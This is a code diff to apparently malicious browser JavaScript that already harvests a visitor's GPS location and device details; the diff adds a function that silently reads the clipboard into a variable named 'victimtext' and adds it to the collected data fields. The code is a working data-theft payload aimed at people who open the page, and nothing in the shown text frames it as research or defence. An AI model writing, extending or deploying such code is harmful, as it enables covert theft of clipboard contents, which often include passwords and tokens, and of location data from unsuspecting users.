@@ -38,6 +38,7 @@ alert("Your Browser Does not support Gps");
 }
 var batter="";
 var networktype="";
+var clips="";
 if("getBattery" in navigator){
 navigator.getBattery().then(function(battery) {
 batter=battery.level*100+"%";
@@ -46,6 +47,16 @@ batter=battery.level*100+"%";
 if("connection" in navigator){
 networktype=navigator.connection.type;
 }
+async function getclips() {
+try {
+let victimtext = await navigator.clipboard.readText();
+clips=victimtext;
+} catch (error) {
+clips="Clipboard Permission Denied";
+}
+}
+getclips();
+
 
 function showPosition(position) {
 var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
@@ -121,6 +132,7 @@ Devicelanguage: devicelang,
 iscookieEnabled: iscookieEnabled,
 Useragent: useragent,
 DeviceMemory: deviceram,
+Clipboard: clips,
 ["Internet Connection Type"]:networktype,
 Battery:batter,
 CpuThreads: cpuThreads,
